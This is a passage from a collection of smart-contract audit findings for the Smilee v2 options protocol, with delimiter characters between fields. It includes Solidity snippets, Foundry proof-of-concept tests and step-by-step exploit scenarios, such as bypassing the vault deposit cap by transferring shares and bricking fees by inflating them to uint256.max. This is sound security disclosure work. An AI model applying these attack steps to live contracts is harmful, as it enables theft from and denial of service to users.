}\n\n        uint256 obtainedPremium;\n        uint256 fee;\n        (obtainedPremium, fee) = dvp.premium(params.strike, params.notionalUp, params.notionalDown);\n\n        // Transfer premium:\n        // NOTE: The PositionManager is just a middleman between the user and the DVP\n        IERC20 baseToken = IERC20(dvp.baseToken());\n        baseToken.safeTransferFrom(msg.sender, address(this), obtainedPremium);\n\n        // Premium already include fee\n        baseToken.safeApprove(params.dvpAddr, obtainedPremium);\n\n==>     premium = dvp.mint(\n            address(this),\n            params.strike,\n            params.notionalUp,\n            params.notionalDown,\n            params.expectedPremium,\n            params.maxSlippage,\n            params.nftAccessTokenId\n        );\n\n        // // rest of code.\n    }\n```\n\n```\n    /// @inheritdoc IDVP\n    function mint(\n        address recipient,\n        uint256 strike,\n        uint256 amountUp,\n        uint256 amountDown,\n        uint256 expectedPremium,\n        uint256 maxSlippage,\n        uint256 nftAccessTokenId\n    ) external override returns (uint256 premium_) {\n        strike;\n        _checkNFTAccess(nftAccessTokenId, recipient, amountUp + amountDown);\n        Amount memory amount_ = Amount({up: amountUp, down: amountDown});\n\n==>     premium_ = _mint(recipient, financeParameters.currentStrike, amount_, expectedPremium, maxSlippage);\n    }\n```\n\n```\n    function mint(\n        IPositionManager.MintParams calldata params\n    ) external override returns (uint256 tokenId, uint256 premium) {\n        // // rest of code\n\n        if (obtainedPremium > premium) {\n            baseToken.safeTransferFrom(address(this), msg.sender, obtainedPremium - premium);\n        }\n\n        if (params.tokenId == 0) {\n            // Mint token:\n            tokenId = _nextId++;\n            _mint(params.recipient, tokenId);\n\n            Epoch memory epoch = dvp.getEpoch();\n\n            // Save position:\n            _positions[tokenId] = ManagedPosition({\n                dvpAddr: params.dvpAddr,\n==>             strike: params.strike,\n                expiry: epoch.current,\n                premium: premium,\n                leverage: (params.notionalUp + params.notionalDown) / premium,\n                notionalUp: params.notionalUp,\n                notionalDown: params.notionalDown,\n                cumulatedPayoff: 0\n            });\n        } else {\n            ManagedPosition storage position = _positions[tokenId];\n            // Increase position:\n            position.premium += premium;\n            position.notionalUp += params.notionalUp;\n            position.notionalDown += params.notionalDown;\n            /* NOTE:\n                When, within the same epoch, a user wants to buy, sell partially\n                and then buy again, the leverage computation can fail due to\n                decreased notional; in order to avoid this issue, we have to\n                also adjust (decrease) the premium in the burn flow.\n             */\n            position.leverage = (position.notionalUp + position.notionalDown) / position.premium;\n        }\n\n        emit BuyDVP(tokenId, _positions[tokenId].expiry, params.notionalUp + params.notionalDown);\n        emit Buy(params.dvpAddr, _positions[tokenId].expiry, premium, params.recipient);\n    }\n```\n\nPoC\nAdd the following test to `PositionManagerTest` contract :\n```\n    function testMintAndBurnFail() public {\n        (uint256 tokenId, ) = initAndMint();\n        bytes4 PositionNotFound = bytes4(keccak256(""PositionNotFound()""));\n\n        vm.prank(alice);\n        vm.expectRevert(PositionNotFound);\n        pm.sell(\n            IPositionManager.SellParams({\n                tokenId: tokenId,\n                notionalUp: 10 ether,\n                notionalDown: 0,\n                expectedMarketValue: 0,\n                maxSlippage: 0.1e18\n            })\n        );\n    }\n```\n\nModify `initAndMint` function to the following :\n```\n    function initAndMint() private returns (uint256 tokenId, IG ig) {\n        vm.startPrank(admin);\n        ig = new IG(address(vault), address(ap));\n        ig.grantRole(ig.ROLE_ADMIN(), admin);\n        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);\n        vault.grantRole(vault.ROLE_ADMIN(), admin);\n        vault.setAllowedDVP(address(ig));\n\n        MarketOracle mo = MarketOracle(ap.marketOracle());\n\n        mo.setDelay(ig.baseToken(), ig.sideToken(), ig.getEpoch().frequency, 0, true);\n\n        Utils.skipDay(true, vm);\n        ig.rollEpoch();\n        vm.stopPrank();\n\n        uint256 strike = ig.currentStrike();\n\n        (uint256 expectedMarketValue, ) = ig.premium(0, 10 ether, 0);\n        TokenUtils.provideApprovedTokens(admin, baseToken, DEFAULT_SENDER, address(pm), expectedMarketValue, vm);\n        // NOTE: somehow, the sender is something else without this prank// rest of code\n        vm.prank(DEFAULT_SENDER);\n        (tokenId, ) = pm.mint(\n            IPositionManager.MintParams({\n                dvpAddr: address(ig),\n                notionalUp: 10 ether,\n                notionalDown: 0,\n                strike: strike + 1,\n                recipient: alice,\n                tokenId: 0,\n                expectedPremium: expectedMarketValue,\n                maxSlippage: 0.1e18,\n                nftAccessTokenId: 0\n            })\n        );\n        assertGe(1, tokenId);\n        assertGe(1, pm.totalSupply());\n    }\n```\n\nRun the test :\n```\nforge test --match-contract PositionManagerTest --match-test testMintAndBurnFail -vvv\n```\n"ч"
Whenever swapPrice > oraclePrice, minting via PositionManager will revert, due to not enough funds being obtained from user.чmediumч```\n(obtainedPremium, ) = dvp.premium(params.strike, params.notionalUp, params.notionalDown);\n```\nчIn `PositionManager::mint()`, `obtainedPremium` is calculated in a different way to the actual premium needed, and this will lead to a revert, denying service to users.\nIn `PositionManager::mint()`, the PM gets `obtainedPremium` from DVP::premium():\n```\n(obtainedPremium, ) = dvp.premium(params.strike, params.notionalUp, params.notionalDown);\n```\n\nThen the actual premium used when minting by the DVP is obtained via the following code:\n\nFrom the code above, we can see that the actual premium uses the greater of the two price options. However, `DVP::premium()` only uses the oracle price to determine the `obtainedPremium`.\nThis leads to the opportunity for `premiumSwap > premiumOrac`, so in the PositionManager, `obtainedPremium` is less than the actual premium required to mint the position in the DVP contract.\nThus, when the DVP contract tries to collect the premium from the PositionManager, it will revert due to insufficient balance in the PositionManager:\n```\nIERC20Metadata(baseToken).safeTransferFrom(msg.sender, vault, premium_ + vaultFee);\n```\nчWhen calculating `obtainedPremium`, consider also using the premium from `swapPrice` if it is greater than the premium calculated from `oraclePrice`.\nDiscussion\nsherlock-admin2\n2 comment(s) were left on this issue during the judging contest.\npanprog commented:\nvalid high, dup of #42\ntakarez commented:\nvalid, the calculation should consider the swapPrice; medium(1)\nmetadato-eth\nMEDIUM DoS but 1) no fund at risk, 2) overcome easily by changing the position manager, 3) immediately identifiable by internal testing before official release\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/84174d20544970309c862a2bf35ccfa3046d6bd9.\npanprog\nFix review; Fixed\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чWhenever `swapPrice > oraclePrice`, minting positions via the PositionManager will revert. This is a denial of service to users and this disruption of core protocol functionality can last extended periods of time.\nCode Snippet\nTool used\nManual Review
Transferring ERC20 Vault tokens to another address and then withdrawing from the vault breaks `totalDeposit` accounting which is tied to deposit addressesчmediumч```\ncontract Vault is IVault, ERC20, EpochControls, AccessControl, Pausable {\n```\nчVault inherits from the ERC20, so it has transfer functions to transfer vault shares. However, `totalDeposit` accounting is tied to addresses of users who deposited with the assumption that the same user will withdraw those shares. This means that any vault tokens transfer and then withdrawal from either user breaks the accounting of `totalDeposit`, allowing to either bypass the vault's max deposit limitation, or limit the vault from new deposits, by making it revert for exceeding the vault deposit limit even if the amount deposited is very small.\n`Vault` inherits from ERC20:\n```\ncontract Vault is IVault, ERC20, EpochControls, AccessControl, Pausable {\n```\n\nwhich has public `transfer` and `transferFrom` functions to `transfer` tokens to the other users, which any user can call:\n```\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n```\n\nIn order to limit the deposits to vault limit, vault has `maxDeposit` parameter set by admin. It is used to limit the deposits above this amount, reverting deposit transactions if exceeded:\n```\n    // Avoids underflows when the maxDeposit is setted below than the totalDeposit\n    if (_state.liquidity.totalDeposit > maxDeposit) {\n        revert ExceedsMaxDeposit();\n    }\n\n    if (amount > maxDeposit - _state.liquidity.totalDeposit) {\n        revert ExceedsMaxDeposit();\n    }\n```\n\nIn order to correctly calculate the current vault deposits (_state.liquidity.totalDeposit), the vault uses the following:\nVault tracks cumulative deposit for each user (depositReceipt.cumulativeAmount)\nWhen user deposits, cumulative deposit and vault's `totalDeposit` increase by the amount of asset deposited\nWhen user initiates withdrawal, both user's cumulative amount and `totalDeposit` are reduced by the percentage of cumulative amount, which is equal to perecentage of shares being withdrawn vs all shares user has.\nThis process is necessary, because the share price changes between deposit and withdrawal, so it tracks only actual deposits, not amounts earned or lost due to vault's profit and loss.\nAs can easily be seen, this withdrawal process assumes that users can't transfer their vault shares, because otherwise the withdrawal from the user who never deposited but got shares will not reduce `totalDeposit`, and user who transferred the shares away and then withdraws all remaining shares will reduce `totalDeposit` by a large amount, while the amount withdrawn is actually much smaller.\nHowever, since `Vault` is a normal `ERC20` token, users can freely transfer vault shares to each other, breaking this assumption. This leads to 2 scenarios:\nIt's easily possible to bypass vault deposit cap: 1.1. Alice deposits up to max deposit cap (say, 1M USDC) 1.2. Alice transfers all shares except 1 wei to Bob 1.3. Alice withdraws 1 wei share. This reduces `totalDeposit` by full Alice deposited amount (1M USDC), but only 1 wei share is withdrawn, basically 0 assets withdrawn. 1.4. Alice deposits 1M USDC again (now the total deposited into the vault is 2M, already breaking the cap of 1M).\nIt's easily possible to lock the vault from further deposits even though the vault might have small amount (or even 0) assets deposited. 2.1. Alice deposits up to max deposit cap (say, 1M USDC) 2.2. Alice transfers all shares except 1 wei to Bob 2.3. Bob withdraws all shares. Since Bob didn't deposit previously, this doesn't reduce `totalDeposit` at all, but withdraws all 1M USDC to Bob. At this point `totalDeposit` = 1M USDC, but vault has 0 assets in it and no further deposits are accepted due to `maxDeposit` limit.чEither disallow transferring of vault shares or track vault assets instead of deposits. Alternatively, re-design the withdrawal system (for example, throw out cumulative deposit calculation and simply calculate total assets and total shares and when withdrawing - reduce `totalDeposit` by the sharesWithdrawn / totalShares * totalDeposit)\nDiscussion\nsherlock-admin4\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid; maxDeposit cap can be bypassed; medium(10)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/2f2feb651c6528b0405d36b6bfe760d66a515335.\npanprog\nFix Review: It's still possible to bypass deposit limit by transferring vault token to vault itself (transfers to vault still don't do anything). However, all extra deposits will be lost since vault will own them and nobody will be able to withdraw it. So all those extra deposits will by unrecoverable, but deposit amounts will still be above the limit, which can influence (inflate) delta hedge amounts and the other things which deposit limit is expected to control. The impact is now less severe than originally as it's very costly to bypass deposit limit and no benefit for the attacker.чImportant security measure of vault max deposit limit can be bypassed, potentially losing funds for the users when the admin doesn't want to accept large amounts for various reasons (like testing something).\nIt's possible to lock vault from deposits by inflating the `totalDeposit` without vault having actual assets, rendering the operations useless due to lack of liquidity and lack of ability to deposit. Even if `maxDeposit` is increased, `totalDeposit` can be inflated again, breaking protocol core functioning.\nProof Of Concept\nExecution console:\n```\n  current epoch 1698566400\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n  dead false\n  lockedInitially 2000000000000000000\n  pendingDeposits 0\n  pendingWithdrawals 0\n  pendingPayoffs 0\n  heldShares 0\n  newHeldShares 0\n  base token notional 1000000000000000000\n  side token notional 1000000000000000000\n  ----------------------------------------\n  total deposits 2000000000000000000\n  current epoch 1698566400\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n  dead false\n  lockedInitially 2000000000000000000\n  pendingDeposits 0\n  pendingWithdrawals 0\n  pendingPayoffs 0\n  heldShares 0\n  newHeldShares 1\n  base token notional 1000000000000000000\n  side token notional 1000000000000000000\n  ----------------------------------------\n  total deposits 1000000000000000000\n```\n\nNotice:\nDemonstrates vault deposit limit bypass\nVault has total assets of 2, but the total deposits is 1, allowing further deposits.\nCode Snippet\nTool used\nManual Review
PositionManager will revert when trying to return back to user excess of the premium transferred from the user when minting positionчmediumч```\n    if (obtainedPremium > premium) {\n        baseToken.safeTransferFrom(address(this), msg.sender, obtainedPremium - premium);\n    }\n```\nч"`PositionManager.mint` calculates preliminary premium to be paid for buying the option and transfers it from the user. The actual premium paid may differ, and if it's smaller, excess is returned back to user. However, it is returned using the safeTransferFrom:\n```\n    if (obtainedPremium > premium) {\n        baseToken.safeTransferFrom(address(this), msg.sender, obtainedPremium - premium);\n    }\n```\n\nThe problem is that `PositionManager` doesn't approve itself to transfer baseToken to `msg.sender`, and USDC `transferFrom` implementation requires approval even if address is transferring from its own address. Thus the transfer will revert and user will be unable to open position.\nBoth `transferFrom` implementations in USDC on Arbitrum (USDC and USDC.e) require approval from any address, including when doing transfers from your own address. https://arbiscan.io/address/0x1efb3f88bc88f03fd1804a5c53b7141bbef5ded8#code\n```\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""ERC20: transfer amount exceeds allowance""));\n        return true;\n    }\n```\n\nhttps://arbiscan.io/address/0x86e721b43d4ecfa71119dd38c0f938a75fdb57b3#code\n```\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    )\n        external\n        override\n        whenNotPaused\n        notBlacklisted(msg.sender)\n        notBlacklisted(from)\n        notBlacklisted(to)\n        returns (bool)\n    {\n        require(\n            value <= allowed[from][msg.sender],\n            ""ERC20: transfer amount exceeds allowance""\n        );\n        _transfer(from, to, value);\n        allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);\n        return true;\n    }\n```\n\n`PositionManager` doesn't approve itself to do transfers anywhere, so `baseToken.safeTransferFrom(address(this), msg.sender, obtainedPremium - premium);` will always revert, preventing the user from opening position via `PositionManager`, breaking important protocol function."ч"Consider using `safeTransfer` instead of `safeTransferFrom` when transferring token from self.\nDiscussion\nsherlock-admin2\n2 comment(s) were left on this issue during the judging contest.\nsantipu_ commented:\nInvalid - code will never execute bc actual premium is always >= obtainedPremium due to using the worst price between oracle and swap.\ntakarez commented:\nvalid, medium(2)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/84174d20544970309c862a2bf35ccfa3046d6bd9.\npanprog\nFix review: Fixed\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.\nsantipu03\nEscalate\nThis issue is LOW because the bug will never be triggered.\n`PositionManager` calculates the variable `obtainedPremium` calling `DVP.premium`, that uses the oracle price to calculate the premium:\n```\npremium_ = _getMarketValue(financeParameters.currentStrike, amount_, true, price);\n```\n\nLater, when minting the position, the actual premium is calculated on `DVP._mint`, using the oracle price and the swap price:\n```\nuint256 swapPrice = _deltaHedgePosition(strike, amount, true);\nuint256 premiumOrac = _getMarketValue(strike, amount, true, IPriceOracle(_getPriceOracle()).getPrice(sideToken, baseToken));\nuint256 premiumSwap = _getMarketValue(strike, amount, true, swapPrice);\npremium_ = premiumSwap > premiumOrac ? premiumSwap : premiumOrac;\n```\n\nThe actual premium to pay will be the result of the higher value between the swap-priced premium and the oracle-priced premium. So, in the scenario where the swap price is lower than the oracle price, the oracle price will be used to compute the final premium.\nTherefore, it's not possible that the final premium is a lower value than `obtainedPremium`, so the bug will never be triggered because the condition `obtainedPremium` > premium will never be true.\nsherlock-admin2\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\npanprog\nYes, the way it is now, it can never actually happen but that's only due to another issue which makes it revert if any DEX slippage occurs. When it works as intended, the remainder has to be transferred back to the sender.\nSo yeah, up to judge to decide. I consider it borderline, because if we isolate ""how it is supposed to work"", returning back the remainder should be possible, it's impossible only due to a different issue.\ncvetanovv\nIt seems that the report is invalid. I think we should judge according to the code that is at the moment, not if it works properly.\nnevillehuang\nBased on head of judging comments in a previous contest for such issues, I believe this should remain valid.\nCzar102\nI agree with @panprog and @nevillehuang – the fix to the other issue will not fix this one. Hence, these are separate issues and both of them may be valid since they present discrepancies from the expected behavior of the contracts.\nI'm planning to reject the escalation and leave the issue as is.\nCzar102\nResult: Medium Has duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nsantipu03: rejected"чUser is unable to open positions via `PositionManager` in certain situations as all such transactions will revert, breaking important protocol functionality and potentially losing user funds / profit due to failure to open position.\nCode Snippet\nTool used\nManual Review
FeeManager `receiveFee` and `trackVaultFee` functions allow anyone to call it with user-provided dvp/vault address and add any arbitrary feeAmount to any address, breaking fees accounting and temporarily bricking DVP smart contractчmediumч```\n    function trackVaultFee(address vault, uint256 feeAmount) external {\n        // Check sender:\n        IDVP dvp = IDVP(msg.sender);\n        if (vault != dvp.vault()) {\n            revert WrongVault();\n        }\n\n        vaultFeeAmounts[vault] += feeAmount;\n\n        emit TransferVaultFee(vault, feeAmount);\n    }\n```\nч`FeeManager` uses `trackVaultFee` function to account vault fees. The problem is that this function can be called by any smart contract implementing `vault()` function (there are no address or role authentication), thus malicious user can break all vault fees accounting by randomly inflating existing vault's fees, making it hard/impossible for admins to determine the real split of fees between vaults. Moreover, malicious user can provide such `feeAmount` to `trackVaultFee` function, which will increase any vault's fee to `uint256.max` value, meaning all following calls to `trackVaultFee` will revert due to fee addition overflow, temporarily bricking DVP smart contract, which calls `trackVaultFee` on all mints and burns, which will always revert until `FeeManager` smart contract is updated to a new address in `AddressProvider`.\nSimilarly, `receiveFee` function is used to account fee amounts received by different addresses (dvp), which can later be withdrawn by admin via `withdrawFee` function. The problem is that any smart contract implementing `baseToken()` function can call it, thus any malicious user can break all accounting by adding arbitrary amounts to their addresses without actually paying anything. Once some addresses fees are inflated, it will be difficult for admins to track fee amounts which are real, and which are from fake dvps and fake tokens.\n`FeeManager.trackVaultFee` function has no role/address check:\n```\n    function trackVaultFee(address vault, uint256 feeAmount) external {\n        // Check sender:\n        IDVP dvp = IDVP(msg.sender);\n        if (vault != dvp.vault()) {\n            revert WrongVault();\n        }\n\n        vaultFeeAmounts[vault] += feeAmount;\n\n        emit TransferVaultFee(vault, feeAmount);\n    }\n```\n\nAny smart contract implementing `vault()` function can call it. The vault address returned can be any address, thus user can inflate vault fees both for existing real vaults, and for any addresses user chooses. This totally breaks all vault fees accounting.\n`FeeManager.receiveFee` function has no role/address check either:\n```\n    function receiveFee(uint256 feeAmount) external {\n        _getBaseTokenInfo(msg.sender).safeTransferFrom(msg.sender, address(this), feeAmount);\n        senders[msg.sender] += feeAmount;\n\n        emit ReceiveFee(msg.sender, feeAmount);\n    }\n// rest of code\n    function _getBaseTokenInfo(address sender) internal view returns (IERC20Metadata token) {\n        token = IERC20Metadata(IVaultParams(sender).baseToken());\n    }\n```\n\nAny smart contract crafted by malicious user can call it. It just has to return base token, which can also be token created by the user. After transfering this fake base token, the `receiveFee` function will increase user's fee balance as if it was real token transferred.чConsider adding a whitelist of addresses which can call these functions.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid; medium(4)\nmetadato-eth\nMEDIUM The issue is real but does not expose any fund at risk, it only transaltes in DoS, which would be easily solved by deploying a fixed fee manager.\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/0ae2a2b82f291e76919168b5bbfdf1d1a8c4f17a.\npanprog\nFix review: Fixed\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чMalicious users can break all fee and vault fee accounting by inflating existing vaults or user addresses fees earned without actually paying these fees, making it hard/impossible for admins to determine the actual fees earned from each vault or dvp. Moreover, malicious user can temporarily brick DVP smart contract by inflating vault's accounted fees to `uint256.max`, thus making all DVP mints and burns (which call trackVaultFee) revert.\nCode Snippet\nTool used\nManual Review
Trading out of the money options has delta = 0 which breaks protocol assumptions of traders profit being fully hedged and can result in a loss of funds to LPsчmediumч```\n    /**\n        Δ_bull = (1 / θ) * F\n        F = {\n@@@         * 0                     if (S < K)\n            * (1 - √(K / Kb)) / K   if (S > Kb)\n            * 1 / K - 1 / √(S * K)  if (K < S < Kb)\n        }\n    */\n    function bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s <= k) {\n@@@         return 0;\n        }\n```\nчSmilee protocol fully hedges all traders pnl by re-balancing the vault between base and side tokens after each trade. This is the assumption about this from the docs:\nThis ensures Smilee has always the correct exposure to the reference tokens to:\nCover Impermanent Gain payoffs, no matter how much money traders earn and when they trade.\nEnsure Liquidity Providers gets the same payoff of a DEX LP*\nEnsure the protocol is not exposed to any shortfall. https://docs.smilee.finance/protocol-design/delta-hedging\nIn the other words, any profit for traders is taken from the hedge and not from the vault Liquidity Providers funds. LP payoff must be at least the underlying DEX (Uniswap) payoff without fees with the same settings.\nHowever, out of the money options (IG Bull when `price < strike` or IG Bear when price > strike) have `delta = 0`, meaning that trading such options doesn't influence vault re-balancing. Since the price of these options changes depending on current asset price, any profit gained by traders from these trades is not hedged and thus becomes the loss of the vault LPs, breaking the assumption referenced above.\nAs a result, LPs payout can becomes less than underlying DEX LPs payout without fees. And in extreme cases the vault funds might not be enough to cover traders payoff.\nWhen the vault delta hedges its position after each trade, it only hedges in the money options, ignoring any out of the money options. For example, this is the calculation of the IG Bull delta (s is the current asset price, `k` is the strike):\n```\n    /**\n        Δ_bull = (1 / θ) * F\n        F = {\n@@@         * 0                     if (S < K)\n            * (1 - √(K / Kb)) / K   if (S > Kb)\n            * 1 / K - 1 / √(S * K)  if (K < S < Kb)\n        }\n    */\n    function bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s <= k) {\n@@@         return 0;\n        }\n```\n\nThis is example scenario to demonstrate the issue:\nstrike = 1\nvault has deposits = 2 (base = 1, side = 1), available liquidity: bull = 1, bear = 1\ntrader buys 1 IG bear. This ensures that no vault re-balance happens when `price < strike`\nprice drops to 0.9. Trader buys 1 IG bull (premium paid = 0.000038)\nprice raises to 0.99. Trader sells 1 IG bull (premium received = 0.001138). Trader profit = 0.0011\nprice is back to 1. Trader sells back 1 IG bear.\nat this point the vault has (base = 0.9989, side = 1), meaning LPs have lost some funds when the price = strike.\nWhile the damage from 1 trade is not large, if this is repeated several times, the damage to LP funds will keep inceasing.\nThis can be especially dangerous if very long dated expiries are used, for example annual IG options. If the asset price remains below the strike for most of the time and IG Bear liquidity is close to 100% usage, then all IG Bull trades will be unhedged, thus breaking the core protocol assumption that traders profit should not translate to LPs loss: in such case traders profit will be the same loss for LPs. In extreme volatility, if price drops by 50% then recovers, traders can profit 3% of the vault with each trade, so after 33 trades the vault will be fully drained.чThe issue seems to be from the approximation of the delta for OTM options. Statistically, long-term, the issue shouldn't be a problem as the long-term expectation is positive for the LPs profit due to it. However, short-term, the traders profit can create issues, and this seems to be the protocol's core assumption. Possible solution can include more precise delta calculation, maybe still approximation, but slightly more precise than the current approximation used.\nAlternatively, keep track of underlying DEX equivalent of LP payoff at the current price and if, after the trade, vault's notional is less than that, add fee = the difference, to ensure that the assumption above is always true (similar to how underlying DEX slippage is added as a fee).\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid; medium(11)\nmetadato-eth\nAcknowledged but not fixed.. We tested it and it does not generate any issue a part from super extreme/ super unlikely scenarios.чIn some specific trading conditions (IG Bear liquidity used close to 100% if price < strike, or IG Bull liquidity used close to 100% if price > strike), all or most of the traders pnl is not hedged and thus becomes loss or profit of the LPs, breaking the core protocol assumptions about hedging and in extreme cases can drain significant percentage of the vault (LPs) funds, up to a point of not being able to payout traders payoff.\nProof Of Concept\nExecution console:\n```\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n  dead false\n  lockedInitially 2000000000000000000\n// rest of code\n  Buy 100% IG BEAR @ 1.0\n  premium 6140201098441368\n  base token notional 1006140201098441412\n  side token notional 999999999999999956\n  Buy 100% IG BULL @ 0.9\n  premium 3853262173300493\n  base token notional 1009993463271741905\n  side token notional 999999999999999956\n  Sell 100% IG BULL @ 0.99\n  payoff received 4865770659690694\n  base token notional 1005127692612051211\n  side token notional 999999999999999956\n// rest of code\n  Buy 100% IG BULL @ 0.9\n  premium 1827837493502948\n  base token notional 984975976168184269\n  side token notional 999999999999999956\n  Sell 100% IG BULL @ 0.99\n  payoff received 3172781130161218\n  base token notional 981803195038023051\n  side token notional 999999999999999956\n  Sell 100% IG BEAR @ 1.0\n  payoff received 3269654020920760\n  base token notional 978533541017102291\n  side token notional 999999999999999956\n```\n\nNotice:\nInitial vault balance at the asset price of 1.0 is base = 1, side = 1\nAll IG Bull trades do not change vault side token balance (no re-balancing happens)\nAfter 20 trades, at the asset price of 1.0, base = 0.9785, side = 1\nThis means that 20 profitable trades create a 1.07% loss for the vault. Similar scenario for annual options with 50% price move shows 3% vault loss per trade.\nCode Snippet\nTool used\nManual Review
If the vault's side token balance is 0 or a tiny amount, then most if not all IG Bear trades will revert due to incorrect check of computation error during delta hedge amount calculationчmediumч```\n    if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n        if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n            tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n        }\n    }\n```\nчWhen delta hedge amount is calculated in `FinanceIGDelta.deltaHedgeAmount`, the last step is to verify that delta hedge amount to sell is slightly more than vault's side token due to computation error. The check is the following:\n```\n    if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n        if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n            tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n        }\n    }\n```\n\nThe check works correctly most of the time, but if the vault's side token (param.sideTokensAmount) is 0 or close to it, then the check will always fail, because `0 / 10000 = 0` and unsigned amount can not be less than 0. This means that even tiny amount to sell (like 1 wei) will revert the transaction if the vault has 0 side tokens.\nVault's side token is 0 when:\nthe current price trades above high boundary (Kb)\nand IG Bull used liquidity equals 0\nIn such situation, any IG bear trade doesn't impact hedge amount, but due to computation error will almost always result in tiny but non-0 side token amount to sell value, which will revert due to incorrect comparision described above.чPossibly check both relative (sideToken / 10000) and absolute (e.g. 1000 or side token UNIT / 10000) value. Alternatively, always limit side token to sell amount to max of side token balance when hedging (but needs additional research if that might create issues).\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid; medium(8)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/a83d79fbd1f7be48f69d36e0cd5812c333a44ce8.\npanprog\nFix review: Fixed\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чAlmost all IG Bear trades will revert in certain situations, leading to core protocol function being unavailable and potentially loss of funds to the users who expected to do these trades.\nProof Of Concept\nNotice: execution will revert when trying to buy IG Bear options.\nCode Snippet\nTool used\nManual Review
Mint and sales can be dossed due to lack of safeApprove to 0чmediumч"```\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            ""SafeERC20: approve from non-zero to non-zero allowance""\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n```\n"ч"The lack of approval to 0 to the dvp contract, and the fee managers during DVP mints and sales will cause that subsequent transactions involving approval of these contracts to spend the basetoken will fail, breaking their functionality.\nWhen DVPs are to be minted and sold through the PositionManager, the `mint` and `sell` functions are invoked. The first issue appears here, where the DVP contract is approved to spend the basetoken using the OpenZeppelin's `safeApprove` function, without first approving to zero. Further down the line, the `mint` and `sell` functions make calls to the DVP contract to `mint` and burn DVP respectively.\nThe _mint and _burn functions in the DVP contract approves the fee manager to spend the fee - vaultFee/netFee.\nThis issue here is that OpenZeppelin's `safeApprove()` function does not allow changing a non-zero allowance to another non-zero allowance. This will therefore cause all subsequent approval of the basetoken to fail after the first approval, dossing the contract's minting and selling/burning functionality.\nOpenZeppelin's `safeApprove()` will revert if the account already is approved and the new `safeApprove()` is done with a non-zero value.\n```\n    function safeApprove(\n        IERC20 token,\n        address spender,\n        uint256 value\n    ) internal {\n        // safeApprove should only be called when setting an initial allowance,\n        // or when resetting it to zero. To increase and decrease it, use\n        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'\n        require(\n            (value == 0) || (token.allowance(address(this), spender) == 0),\n            ""SafeERC20: approve from non-zero to non-zero allowance""\n        );\n        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n    }\n```\n"чApprove first to 0;\nUpdate the OpenZeppelin version to the latest and use the `forceApprove` functions instead;\nRefactor the functions to allow for direct transfer of base tokens to the DVP and FeeManager contracts directly.\nDiscussion\nsherlock-admin4\n2 comment(s) were left on this issue during the judging contest.\npanprog commented:\nvalid medium. dup of #41\ntakarez commented:\nvalid; medium(3)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/84174d20544970309c862a2bf35ccfa3046d6bd9.\npanprog\nFix review: Fixed\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чThis causes that after the first approval for the baseToken has been given, subsequent approvals will fail causing the functions to fail.\nCode Snippet\n```\n    function _mint(\n        address recipient,\n        uint256 strike,\n        Amount memory amount,\n        uint256 expectedPremium,\n        uint256 maxSlippage\n    ) internal returns (uint256 premium_) {\n// rest of code\n        // Get fees from sender:\n        IERC20Metadata(baseToken).safeTransferFrom(msg.sender, address(this), fee - vaultFee);\n        IERC20Metadata(baseToken).safeApprove(address(feeManager), fee - vaultFee); //@note\n        feeManager.receiveFee(fee - vaultFee);\n// rest of code\n    }\n```\n\n```\n    function _burn(\n        uint256 expiry,\n        address recipient,\n        uint256 strike,\n        Amount memory amount,\n        uint256 expectedMarketValue,\n        uint256 maxSlippage\n    